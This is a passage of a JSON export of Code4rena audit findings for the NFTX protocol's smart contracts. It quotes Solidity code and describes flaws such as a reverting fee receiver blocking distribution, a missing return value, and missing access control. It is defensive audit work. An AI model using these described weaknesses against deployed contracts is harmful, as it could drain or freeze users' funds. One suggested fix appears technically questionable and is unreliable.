dist.balanceOf(msg.sender), msg.sender); } ```  https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/token/TimelockRewardDistributionTokenImpl.sol#L199-L206 ``` function _transfer(address from, address to, uint256 value) internal override {   require(block.timestamp > timelock[from], \"User locked\");   super._transfer(from, to, value);    int256 _magCorrection = magnifiedRewardPerShare.mul(value).toInt256();   magnifiedRewardCorrections[from] = magnifiedRewardCorrections[from].add(_magCorrection);   magnifiedRewardCorrections[to] = magnifiedRewardCorrections[to].sub(_magCorrection); } ```  ## Tools Used  Manual code review.  ## Recommended Mitigation Steps  Consider removing functions in `NFTXLPStaking` that do not claim token rewards before unstaking LP tokens or alternatively add code to the affected functions such that rewards are claimed before withdrawing LP tokens.  "}, {"title": "Malicious receiver can make distribute function denial of service", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/69", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  cccz   # Vulnerability details  ## Impact  In the NFTXSimpleFeeDistributor.sol contract, the distribute function calls the _sendForReceiver function to distribute the fee  ```   function distribute(uint256 vaultId) external override virtual nonReentrant {     require(nftxVaultFactory != address(0));     address _vault = INFTXVaultFactory(nftxVaultFactory).vault(vaultId);      uint256 tokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this));      if (distributionPaused || allocTotal == 0) {       IERC20Upgradeable(_vault).safeTransfer(treasury, tokenBalance);       return;     }      uint256 length = feeReceivers.length;     uint256 leftover;     for (uint256 i = 0; i <length; i++) {       FeeReceiver memory _feeReceiver = feeReceivers[i];       uint256 amountToSend = leftover + ((tokenBalance * _feeReceiver.allocPoint) / allocTotal);       uint256 currentTokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this));       amountToSend = amountToSend> currentTokenBalance? currentTokenBalance: amountToSend;       bool complete = _sendForReceiver(_feeReceiver, vaultId, _vault, amountToSend);       if (!complete) {         leftover = amountToSend;       } else {         leftover = 0;       }     } ```  In the _sendForReceiver function, when the _receiver is a contract, the receiver's receiveRewards function will be called. If the receiver is malicious, it can execute revert() in the receiveRewards function, resulting in DOS.  ```   function _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {     if (_receiver.isContract) {       IERC20Upgradeable(_vault).approve(_receiver.receiver, amountToSend);       // If the receive is not properly processed, send it to the treasury instead.               bytes memory payload = abi.encodeWithSelector(INFTXLPStaking.receiveRewards.selector, _vaultId, amountToSend);       (bool success,) = address(_receiver.receiver).call(payload);        // If the allowance has not been spent, it means we can pass it forward to next.       return success && IERC20Upgradeable(_vault).allowance(address(this), _receiver.receiver) == 0;     } else {       IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);     }   } ```  ## Proof of Concept  https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L157-L166  ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  The contract can store the fee sent to the receiver in a state variable, and then the receiver can take it out by calling a function.  "}, {"title": "The return value of the _sendForReceiver function is not set, causing the receiver to receive more fees", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/67", "labels": ["bug", "3 (High Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  cccz   # Vulnerability details  ## Impact  In the NFTXSimpleFeeDistributor.sol contract, the distribute function is used to distribute the fee, and the distribute function judges whether the fee is sent successfully according to the return value of the _sendForReceiver function.  ```   function distribute(uint256 vaultId) external override virtual nonReentrant {     require(nftxVaultFactory != address(0));     address _vault = INFTXVaultFactory(nftxVaultFactory).vault(vaultId);      uint256 tokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this));      if (distributionPaused || allocTotal == 0) {       IERC20Upgradeable(_vault).safeTransfer(treasury, tokenBalance);       return;     }      uint256 length = feeReceivers.length;     uint256 leftover;     for (uint256 i = 0; i <length; i++) {       FeeReceiver memory _feeReceiver = feeReceivers[i];       uint256 amountToSend = leftover + ((tokenBalance * _feeReceiver.allocPoint) / allocTotal);       uint256 currentTokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this));       amountToSend = amountToSend> currentTokenBalance? currentTokenBalance: amountToSend;       bool complete = _sendForReceiver(_feeReceiver, vaultId, _vault, amountToSend);       if (!complete) {         leftover = amountToSend;       } else {         leftover = 0;       }     } ```  In the _sendForReceiver function, when _receiver is not a contract, no value is returned. By default, this will return false. This will make the distribute function think that the fee sending has failed, and will send more fees next time.  ```   function _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {     if (_receiver.isContract) {       IERC20Upgradeable(_vault).approve(_receiver.receiver, amountToSend);       // If the receive is not properly processed, send it to the treasury instead.               bytes memory payload = abi.encodeWithSelector(INFTXLPStaking.receiveRewards.selector, _vaultId, amountToSend);       (bool success,) = address(_receiver.receiver).call(payload);        // If the allowance has not been spent, it means we can pass it forward to next.       return success && IERC20Upgradeable(_vault).allowance(address(this), _receiver.receiver) == 0;     } else {       IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);     }   } ``` ## Proof of Concept  https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L157-L168  https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L49-L67  ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  ```   function _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {     if (_receiver.isContract) {       IERC20Upgradeable(_vault).approve(_receiver.receiver, amountToSend);       // If the receive is not properly processed, send it to the treasury instead.               bytes memory payload = abi.encodeWithSelector(INFTXLPStaking.receiveRewards.selector, _vaultId, amountToSend);       (bool success, ) = address(_receiver.receiver).call(payload);        // If the allowance has not been spent, it means we can pass it forward to next.       return success && IERC20Upgradeable(_vault).allowance(address(this), _receiver.receiver) == 0;     } else {       - IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);       + return IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);     }   } ```  "}, {"title": "`assignDefaultFeatures` Does Nothing", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/65", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  leastwood   # Vulnerability details  ## Impact  `assignDefaultFeatures` is intended to be called by the `dev` account, however, the function itself does not take in any arguments and instead sets the `enableRandomSwap` and `enableTargetSwap` state variables to itself.  ## Proof of Concept  https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXVaultUpgradeable.sol#L111-L117 ``` function assignDefaultFeatures() external {     require(msg.sender == 0xDEA9196Dcdd2173D6E369c2AcC0faCc83fD9346a, \"Not dev\");     enableRandomSwap = enableRandomRedeem;     enableTargetSwap = enableTargetRedeem;     emit EnableRandomSwapUpdated(enableRandomSwap);     emit EnableTargetSwapUpdated(enableTargetSwap); } ```  ## Tools Used  Manual code review.  ## Recommended Mitigation Steps  Consider removing this function altogether or adding the necessary arguments such that the `dev` account can actually set the proper state variables.  "}, {"title": "`timelockMint` In `TimelockRewardDistributionTokenImpl` Does Not Ensure Mint Is Greater Than Zero", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/64", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "`timelockMint` In `TimelockRewardDistributionTokenImpl` Does Not Ensure Mint Is Greater Than Zero"}, {"title": "InventoryStaking `deposit()` and `withdraw()` don't validate passed vaultId", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/61", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "InventoryStaking `deposit()` and `withdraw()` don't validate passed vaultId"}, {"title": "`xToken` Approvals Allow Spenders To Spend More Tokens", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/58", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "`xToken` Approvals Allow Spenders To Spend More Tokens"}, {"title": "Dishonest Stakers Can Siphon Rewards From `xToken` Holders Through The `deposit` Function In `NFTXInventoryStaking`", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/57", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Dishonest Stakers Can Siphon Rewards From `xToken` Holders Through The `deposit` Function In `NFTXInventoryStaking`"}, {"title": "Users can create vaults with a malicious _assetAddress ", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/56", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Users can create vaults with a malicious _assetAddress "}, {"title": "`NFTXLPStaking.rewardDistTokenImpl` is never initialized", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/54", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "`NFTXLPStaking.rewardDistTokenImpl` is never initialized"}, {"title": "Unnecessary assignment of 0 to an uninitialized variable", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/53", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2021-12-nftx-findings", "body": "Unnecessary assignment of 0 to an uninitialized variable"}, {"title": "onlyOwnerIfPaused(0) argument should not be hard coded ", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/52", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "onlyOwnerIfPaused(0) argument should not be hard coded "}, {"title": "Marketplace allows functions made for ERC721 vaults to interact with ERC1155 vaults", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/51", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Marketplace allows functions made for ERC721 vaults to interact with ERC1155 vaults"}, {"title": "No access control on assignFees() function in NFTXVaultFactoryUpgradeable contract", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/50", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  ych18   # Vulnerability details  In If the Vault owner decides to set factoryMintFee and factoryRandomRedeemFee to zero, any user could call the function NFTXVaultFactoryUpgradeable.assignFees() and hence all the fees are updated.  "}]